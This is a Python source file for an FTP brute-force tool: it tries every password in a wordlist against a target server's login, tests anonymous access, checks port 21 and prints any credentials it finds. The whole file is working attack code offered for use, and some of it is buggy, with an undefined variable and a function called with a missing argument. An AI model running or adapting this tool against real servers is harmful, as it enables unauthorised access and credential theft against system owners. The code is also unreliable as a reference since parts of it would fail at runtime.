#!/bin/python3

from ftplib import FTP
import socket, argparse

def main():
    print("""
      __ _           _                _         _              _ 
     / _| |_ _ __   | |__  _ __ _   _| |_ ___  | |_ ___   ___ | |
    | |_| __| '_ \  | '_ \| '__| | | | __/ _ \ | __/ _ \ / _ \| |
    |  _| |_| |_) | | |_) | |  | |_| | ||  __/ | || (_) | (_) | |
    |_|  \__| .__/  |_.__/|_|   \__,_|\__\___|  \__\___/ \___/|_| v.2
            |_|                                                  
    ---------------------------------------------------------------------
    |   A python 3 FTP brute force tool first written by @hackerman234  |
    |                     Version 2 by: @AJHblu                         |
    ---------------------------------------------------------------------
    """)
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", type=str, dest="target", help="--targets ip", default=None)
    parser.add_argument("-w", type=str, dest="wordlist", help="--wordlist for attack", default=None)
    parser.add_argument("-u", type=str, dest="username", help='--username for ftp', default=None)
    parser.add_argument("-c", type=str, dest="check", help="--checks if ftp is enabled", default=None)
    parser.add_argument("-a", type=str, dest="anon", help="--anonymous login", default=None)
    parser.add_argument("-l", action="store_true", dest="log", help="--log", default=None)
    parser.add_argument("-o", type=str, dest="out", help="--file to output", default=None)

    args = parser.parse_args()

    target = ""
    wordlist = ""
    username = ""
    check = ""
    anon = ""
    out = ""


    target = args.target
    username = args.username
    wordlist = args.wordlist
    check = args.check
    anon = args.anon
    log = args.log
    out = args.out

    if log:
        if out:
            print("please only use -l or -o")
        elif anon:
            Anon_login(anon)
        elif target and username and wordlist:
            logBrute_force(target, username, wordlist)
        elif check:
            Port_21(check)

    elif out: 
        if anon:
            oAnon_login(anon, out)
        elif target and username and wordlist:
            oBrute_force(target, username, wordlist, out)
        elif check:
            Port_21(check)
        
    elif anon:
        Anon_login(anon)
        if target and username and wordlist:
            Brute_force(target, username, wordlist)
        elif check:
            Port_21(check)
        
    else:
        print("[-] Not a valed option please refer to -h for help")


def Anon_login(target):
    print("[*] Trying anonymous login...")
    try:
        ftp = FTP(target)
        ftp.login()
        ftp.quit()
        print("[+] Server has accepted anonymous login!")
    except:
        print("[-] Server does not accept anonymous login")

def oAnon_login(target, out):
    out =str(out) + ".txt"
    file1 = open(out ,"a")

    print("[*] Trying anonymous login...\n", file=file1)
    try:
        ftp = FTP(target)
        ftp.login()
        ftp.quit()
        print("[+] Server has accepted anonymous login! \n", file=file1)
    except:
        print("[-] Server does not accept anonymous login \n", file=file1)

def Port_21(check):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = s.connect_ex((check, 21))
    
    if port == 0:
        s.close()
        print("[+] Port 21 is open")

    else:
        s.close()
        print("[-] Port 21 is not open")

def Brute_force(target, username, wordlist):
    with open(wordlist, "r") as wordlist:
        word = wordlist.readline().strip()
        while word:
            Login_ftp(target, username, word)
            word = wordlist.readline().strip()

def oBrute_force(target, username, wordlist, out):
    with open(wordlist, "r") as wordlist:
        word = wordlist.readline().strip()
        while word:
            oLogin_ftp(target, username, word)
            word = wordlist.readline().strip()


def logBrute_force(target, username, wordlist):
    with open(wordlist, "r") as wordlist:
        word = wordlist.readline().strip()
        while word:
            logLogin_ftp(target, username, word)
            word = wordlist.readline().strip()
 
def logLogin_ftp(target, username, word):
    print("[*] Brute force is trying the password: " + word)
    ftp_session = FTP(target)
    try:
       ftp_session.login(username, word)
       ftp_session.quit()
       print("[+] Brute force is finished")
       print("[+] Username: " + username)
       print("[+] Password: " + word)
    except:
       ftp_session.quit()
       print("[-] Password failed")

def Login_ftp(target, username, word):
    ftp_session = FTP(target)
    try:
       ftp_session.login(username, word)
       ftp_session.quit()
       print("[+] Brute force is finished")
       print("[+] Username: " + username)
       print("[+] Password: " + word)
    except:
       ftp_session.quit()

def oLogin_ftp(target, username, word, out):
    out =str(output) + ".txt"
    file1 = open(out ,"a")
    print("[*] Brute force is trying the password: " + word, "\n", file=file1)
    
    ftp_session = FTP(target)
    try:
       ftp_session.login(username, word)
       ftp_session.quit()
       print("[+] Brute force is finished \n", file=file1)
       print("[+] Username: " + username, "\n", file=file1)
       print("[+] Password: " + word, "\n", file=file1)
    except:
       ftp_session.quit()
       print("[-] Password failed \n", file=file1)

main()
print("[*] The FTP brute tool has finished!")